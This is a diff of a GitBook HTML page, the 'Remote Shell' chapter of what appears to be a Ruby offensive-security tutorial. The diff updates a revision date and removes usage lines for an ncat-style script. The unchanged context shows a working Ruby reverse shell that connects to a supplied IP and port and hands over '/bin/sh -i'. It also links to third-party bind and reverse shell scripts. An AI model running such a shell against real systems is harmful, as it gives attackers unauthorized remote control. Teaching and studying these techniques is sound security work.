@@ -67,7 +67,7 @@
         data-chapter-title="Remote Shell"
         data-filepath="module_0x2__system_kung_fu/system_shell.md"
         data-basepath=".."
-        data-revision="Sat Jan 23 2016 22:14:52 GMT+0300 (AST)"
+        data-revision="Wed Jan 27 2016 09:00:51 GMT+0300 (AST)"
         data-innerlanguage="">
     
 
@@ -1234,14 +1234,6 @@ ip, port = <span class="hljs-constant">ARGV</span>
 s = <span class="hljs-constant">TCPSocket</span>.open(ip,port).to_i
 exec sprintf(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,s,s,s)
 </code></pre>
-<ul>
-<li><p>To listen </p>
-<pre><code>ruby ncat.rb -lvp 443
-</code></pre></li>
-<li><p>To connect </p>
-<pre><code>ruby ncat.rb -cv -r RHOST -p 443
-</code></pre></li>
-</ul>
 <h2 id="bind-and-reverse-shell"><a name="bind-and-reverse-shell" class="plugin-anchor" href="#bind-and-reverse-shell"><span class="fa fa-link"></span></a>Bind and Reverse shell</h2>
 <p>This is an awesome implementation for a standalone  <a href="https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb" target="_blank">bind</a> and <a href="https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb" target="_blank">reverse</a> shells scripts written by <a href="https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells" target="_blank">Hood3dRob1n</a> on GitHub . The bind shell requires authentication while reverse is not.</p>
 <h2 id=""><a name="" class="plugin-anchor" href="#"><span class="fa fa-link"></span></a><br><br><br></h2>
